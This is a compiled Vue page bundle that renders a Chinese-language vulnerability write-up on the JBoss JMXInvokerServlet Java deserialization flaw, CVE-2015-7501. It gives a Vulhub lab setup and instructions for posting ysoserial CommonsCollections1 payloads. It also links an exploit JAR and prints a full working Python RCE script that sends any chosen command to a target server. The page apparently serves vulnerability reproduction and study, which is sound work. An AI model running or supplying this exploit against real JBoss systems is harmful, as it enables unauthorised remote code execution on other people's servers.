import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as i,c,a as n,b as s,d as t,e}from"./app-58e4a7d6.js";const l={},u=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r=n("p",null,[s("这是经典的JBoss反序列化漏洞，JBoss在"),n("code",null,"/invoker/JMXInvokerServlet"),s("请求中读取了用户传入的对象，然后我们利用Apache Commons Collections中的Gadget执行任意代码。")],-1),k=n("p",null,"参考文档：",-1),d={href:"https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/",target:"_blank",rel:"noopener noreferrer"},v={href:"https://www.seebug.org/vuldb/ssvid-89723",target:"_blank",rel:"noopener noreferrer"},m={href:"http://www.freebuf.com/sectool/88908.html",target:"_blank",rel:"noopener noreferrer"},b={href:"https://paper.seebug.org/312/",target:"_blank",rel:"noopener noreferrer"},h=e(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>JBoss AS 4.x及之前版本
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub启动漏洞环境</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>首次执行时会有1~3分钟时间初始化，初始化完成后访问<code>http://your-ip:8080/</code>即可看到JBoss默认页面。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202241443726.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,8),g=n("code",null,"/invoker/JMXInvokerServlet",-1),_={href:"https://github.com/frohoff/ysoserial",target:"_blank",rel:"noopener noreferrer"},y={href:"https://cdn.vulhub.org/deserialization/DeserializeExploit.jar",target:"_blank",rel:"noopener noreferrer"},f=e(`<h2 id="漏洞exp" tabindex="-1"><a class="header-anchor" href="#漏洞exp" aria-hidden="true">#</a> 漏洞EXP</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#! /usr/bin/env python2</span>

<span class="token comment"># Jboss Java Deserialization RCE (CVE-2015-7501)</span>
<span class="token comment"># Made with &lt;3 by @byt3bl33d3r</span>

<span class="token keyword">from</span> __future__ <span class="token keyword">import</span> print_function
<span class="token keyword">import</span> requests
<span class="token keyword">from</span> requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> InsecureRequestWarning
requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>InsecureRequestWarning<span class="token punctuation">)</span>

<span class="token keyword">import</span> argparse
<span class="token keyword">import</span> sys<span class="token punctuation">,</span> os
<span class="token comment">#from binascii import hexlify, unhexlify</span>
<span class="token keyword">from</span> subprocess <span class="token keyword">import</span> check_output

ysoserial_default_paths <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;./ysoserial.jar&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;../ysoserial.jar&#39;</span><span class="token punctuation">]</span>
ysoserial_path <span class="token operator">=</span> <span class="token boolean">None</span>

parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;target&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;Target IP&#39;</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;command&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;Command to run on target&#39;</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--proto&#39;</span><span class="token punctuation">,</span> choices<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">&#39;http&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;https&#39;</span><span class="token punctuation">}</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">&#39;http&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;Send exploit over http or https (default: http)&#39;</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--ysoserial-path&#39;</span><span class="token punctuation">,</span> metavar<span class="token operator">=</span><span class="token string">&#39;PATH&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;Path to ysoserial JAR (default: tries current and previous directory)&#39;</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
    parser<span class="token punctuation">.</span>print_help<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> <span class="token keyword">not</span> args<span class="token punctuation">.</span>ysoserial_path<span class="token punctuation">:</span>
    <span class="token keyword">for</span> path <span class="token keyword">in</span> ysoserial_default_paths<span class="token punctuation">:</span>
        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>
            ysoserial_path <span class="token operator">=</span> path
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>args<span class="token punctuation">.</span>ysoserial_path<span class="token punctuation">)</span><span class="token punctuation">:</span>
        ysoserial_path <span class="token operator">=</span> args<span class="token punctuation">.</span>ysoserial_path

<span class="token keyword">if</span> ysoserial_path <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[-] Could not find ysoserial JAR file&#39;</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>target<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&quot;:&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[-] Target must be in format IP:PORT&#39;</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> <span class="token keyword">not</span> args<span class="token punctuation">.</span>command<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[-] You must specify a command to run&#39;</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

ip<span class="token punctuation">,</span> port <span class="token operator">=</span> args<span class="token punctuation">.</span>target<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&#39;:&#39;</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[*] Target IP: {}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[*] Target PORT: {}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>

gadget <span class="token operator">=</span> check_output<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">&#39;java&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-jar&#39;</span><span class="token punctuation">,</span> ysoserial_path<span class="token punctuation">,</span> <span class="token string">&#39;CommonsCollections1&#39;</span><span class="token punctuation">,</span> args<span class="token punctuation">.</span>command<span class="token punctuation">]</span><span class="token punctuation">)</span>

r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">&#39;{}://{}:{}/invoker/JMXInvokerServlet&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>proto<span class="token punctuation">,</span> ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> data<span class="token operator">=</span>gadget<span class="token punctuation">)</span>

<span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[+] Command executed successfully&#39;</span><span class="token punctuation">)</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,2);function w(x,J){const a=o("ExternalLinkIcon");return i(),c("div",null,[u,r,k,n("ul",null,[n("li",null,[n("a",d,[s("https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/"),t(a)])]),n("li",null,[n("a",v,[s("https://www.seebug.org/vuldb/ssvid-89723"),t(a)])]),n("li",null,[n("a",m,[s("http://www.freebuf.com/sectool/88908.html"),t(a)])]),n("li",null,[n("a",b,[s("https://paper.seebug.org/312/"),t(a)])])]),h,n("p",null,[s("JBoss在处理"),g,s("请求的时候读取了对象，所以我们直接将"),n("a",_,[s("ysoserial"),t(a)]),s("生成好的POC附在POST Body中发送即可。整个过程可参考JBoss 5.x/6.x 反序列化漏洞 CVE-2017-12149。")]),n("p",null,[s("网上已经有很多EXP了，比如"),n("a",y,[s("DeserializeExploit.jar"),t(a)]),s("，直接用该工具执行命令、上传文件即可。")]),f])}const E=p(l,[["render",w],["__file","JBoss JMXInvokerServlet 反序列化漏洞 CVE-2015-7501.html.vue"]]);export{E as default};
